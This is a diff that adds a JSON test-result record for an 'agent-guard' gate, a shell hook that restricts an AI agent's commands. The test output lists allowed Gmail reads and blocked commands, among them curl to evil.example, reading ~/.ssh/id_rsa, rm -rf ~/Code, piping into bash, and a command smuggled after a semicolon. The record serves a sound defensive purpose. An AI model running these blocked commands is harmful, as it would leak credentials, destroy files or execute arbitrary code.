@@ -1,0 +1,30 @@
+{
+  "gate": "agent-guard",
+  "story": "S5-2",
+  "tier": "unit",
+  "acceptance": [
+    "AC-28"
+  ],
+  "passed": true,
+  "problems": [],
+  "tested_commit": "ff7494076c42f2b9557814d67d35114b1a677e68",
+  "worktree_dirty": true,
+  "prd_revision": 7,
+  "gate_sha256": "995a390172a706715d3429b7ea549be75a80d28872b3a908ba0260630266eb0a",
+  "assertion_sha256": {
+    "cos/hooks/agent-guard.sh": "d14f623a7e68ca20e6077b558f6713c61be0356391a7f52ab5886d570998884d",
+    "src/cos/agent.ts": "45dcd200ac98fd7d2e1315b6a714baa98cb1cd357435c66e7df0af9bdc1d7441"
+  },
+  "command": "npx tsx tests/gates/cos-agent.ts agent-guard",
+  "exit_code": 0,
+  "output": "PASS allowed: gws gmail users threads get --params '{\"userId\":\"me\",\"id\":\"t\nPASS allowed: gws gmail users messages list --params '{\"q\":\"AACSB\"}'\nPASS allowed: echo hi > /tmp/x.txt\nPASS blocked: gws gmail users drafts send --json {}\nPASS blocked: gws gmail users drafts create --json {}\nPASS blocked: gws gmail users messages send\nPASS blocked: gws gmail users messages modify --params {}\nPASS blocked: gws gmail users messages trash --params {}\nPASS blocked: gws calendar events insert\nPASS blocked: curl https://evil.example/?d=1\nPASS blocked: wget x\nPASS blocked: echo $(cat ~/.ssh/id_rsa)\nPASS blocked: echo hi > ~/Documents/x\nPASS blocked: python3 -c 1\nPASS blocked: node -e 1\nPASS blocked: osascript -e 1\nPASS blocked: rm -rf ~/Code\nPASS blocked: open https://evil.example\nPASS blocked: gws gmail users threads get x; curl evil\nPASS blocked: cat x | bash\nPASS unparseable input blocked (fail closed)\nPASS agent runs with the guard settings and the charter\nPASS agent tools: Bash (guarded), Read, Grep, Glob only; no web, no edits\nPASS per-run budget capped at $1.50\nPASS settings wire the agent guard",
+  "negative_validation": {
+    "env": {
+      "GUARD": "/usr/bin/true"
+    },
+    "reason": "a no-op guard must fail",
+    "exit_code": 1,
+    "output": "PASS allowed: gws gmail users threads get --params '{\"userId\":\"me\",\"id\":\"t\nPASS allowed: gws gmail users messages list --params '{\"q\":\"AACSB\"}'\nPASS allowed: echo hi > /tmp/x.txt\nFAIL blocked: gws gmail users drafts send --json {}\nFAIL blocked: gws gmail users drafts create --json {}\nFAIL blocked: gws gmail users messages send\nFAIL blocked: gws gmail users messages modify --params {}\nFAIL blocked: gws gmail users messages trash --params {}\nFAIL blocked: gws calendar events insert\nFAIL blocked: curl https://evil.example/?d=1\nFAIL blocked: wget x\nFAIL blocked: echo $(cat ~/.ssh/id_rsa)\nFAIL blocked: echo hi > ~/Documents/x\nFAIL blocked: python3 -c 1\nFAIL blocked: node -e 1\nFAIL blocked: osascript -e 1\nFAIL blocked: rm -rf ~/Code\nFAIL blocked: open https://evil.example\nFAIL blocked: gws gmail users threads get x; curl evil\nFAIL blocked: cat x | bash\nFAIL unparseable input blocked (fail closed)\nPASS agent runs with the guard settings and the charter\nPASS agent tools: Bash (guarded), Read, Grep, Glob only; no web, no edits\nPASS per-run budget capped at $1.50\nPASS settings wire the agent guard"
+  },
+  "timestamp": "2026-09-25T05:36:42.645Z"
+}
